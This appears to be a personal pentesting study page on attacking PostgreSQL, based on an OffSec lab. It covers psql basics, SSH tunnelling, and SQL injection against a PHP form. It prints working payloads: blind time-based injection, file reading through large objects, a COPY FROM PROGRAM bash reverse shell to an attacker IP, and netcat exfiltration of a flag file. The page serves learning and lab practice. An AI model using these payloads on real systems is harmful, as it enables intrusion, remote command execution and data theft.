---
title: "5432 postgresql"
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - postgresql
  - port 5432
---

# 5432 postgreSQL

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql).

!!! tip "Related resources"
	- [Detailed SQLi Cheat sheet for manual attack](sqli-manual-attack.md).
	- [SQL injection](webexploitation/sql-injection.md)
	- [NoSQL injection](webexploitation/nosql-injection.md)
	- [SQL injections](webexploitation/sqlite-injections.md)

??? example "Languages and dictionaries"
	| Server | Dictionary |
	| -- | -- |
	|  [MySQL](mysql.md) | [MySQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md). | 
	| [MSSQL](mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
	|  [PostgreSQL](5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
	|  [Oracle](1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
	| [SQLite](webexploitation/sqlite-injections.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 

??? example "Attack-based dictionaries"
    - [Generic SQL Injection Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/generic-injections)
    - [Generic Error Based Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based).
    - [Generic Union Select Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select).
    - [SQL time based payloads ](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based).
    - [SQL Injection Auth Bypass Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/auth-bypass) 


## Description
In some cases, the default service that runs on TCP port 5432 is PostgreSQL, which is a database management system: creating, modifying, and updating databases, changing and adding data, and more. PostgreSQL can typically be interacted with using a command-line tool called psql.

```bash
psql
```


## Installation

### Linux

If the tool is not installed, then run:

```bash
sudo apt install postgresql-client-common
```

If your user is not in the sudoers file, we can do some workarounds about it. Some options arise here:

-uploading static binaries onto the target machine,
-port-forwarding, or tunneling, using SSH.

Using SSH and postgresql:

**1.** In the attacking machine:

```bash
ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 
# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.
# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.
```

**2.** In another terminal in the attacking machine:

```bash
sudo apt update && sudo apt install postgresql postgresql-client-common 
# this will install postgresql in case you don't have it.

psql -U christine -h localhost -p 1234
# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:
# -U: to specify user.
# -h: to specify localhost. 
# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.
```


### Powershell

```
Install-Module PostgreSQLCmdlets

```


## Basics commands in postgresql

```bash
# List databases
# Short version: \l
\list

# Connect to a database
# Short version: \c NameOfDataBase
\connect NameOfDatabase

# List database tables (once you have selected a database)
\dt

# Dump content from a column
SELECT * FROM NameOfColumn;
# Watch out! Case sensitive
```


## SQLi

Original request:

```html
POST /class.php HTTP/1.1
Host: goldenclove.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 164
Referer: http://goldenclove.com/class.php
Origin: http://goldenclove.com
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Connection: keep-alive

weight=6&height=18&age=6&gender=Male&email=lala%40lala.com
```


```
# Basic time delay confirmation:
height=1'; SELECT pg_sleep(5)--
```

From SQL capstone in Offsec.

### Reading Files via `lo_import()` + `lo_get()`

PostgreSQL allows importing files as large objects (OIDs) and then reading them with `lo_get()`.

#### Example:

Vulnerable code:

```postgresql
$query = pg_query($con, "select * from users where email like '%" . $_POST["height"] . "%'");
```


This pg_query call is not sanitized and allows us to perform multi-statement injections:

```postgresql
height=1';
CREATE TEMP TABLE x(o oid);
INSERT INTO x VALUES(lo_import('/var/www/flag.txt'));
SELECT pg_sleep(5) FROM pg_catalog.pg_largeobject
WHERE substring(convert_from(lo_get((SELECT o FROM x)), 'UTF8'), 1, 1) = 'O'--
```

This triggers a 5-second delay if the first character of `/var/www/flag.txt` is `O`.

### Remote Shell via `COPY FROM PROGRAM`

Installations running Postgres 9.3 and above have functionality which allows for the superuser  and users with 'pg_execute_server_program' to pipe to and from an external program using COPY.   This allows arbitrary command execution as though you have console access.

We confirmed the PostgreSQL user had permission to execute OS-level commands using `COPY FROM PROGRAM`, which allows exfiltration and reverse shells.

Source: https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/

**Trigger reverse shell via `bash`:**

```
POST /class.php HTTP/1.1
Host: goldenclove.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 164
Referer: http://goldenclove.com/class.php
Origin: http://goldenclove.com
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Connection: keep-alive

weight=6&height=1';CREATE TEMP TABLE x();
COPY x FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.201/4321 0>&1"'--age=6&gender=Male&email=lala%40lala.com
```

- Creates a dummy temp table `x` (even without columns)
- Executes `bash` using the `COPY` command to launch an interactive reverse shell

This works **only if executed in the same SQL statement**, due to session-local nature of temp tables.

### Alternative exfiltration via netcat:

```
height=1';
DROP TABLE IF EXISTS x;
CREATE TEMP TABLE x();
COPY x FROM PROGRAM 'cat /var/www/flag.txt | nc 192.168.45.201 1234'--
```

On attacker's side:

```
nc -lvnp 1234
```

It will receive the content of /var/www/flag.txt 

## Important Behavior

- `pg_query()` allows stacked queries with `;`
    
- Each HTTP request creates a **new PostgreSQL session**
    
- `TEMP TABLE`s and `lo_import()` are **session-scoped**
    
- `COPY FROM PROGRAM` requires **superuser or pg_execute_server_program**
    
- Blind SQLi must be exploited **within a single SQL statement**
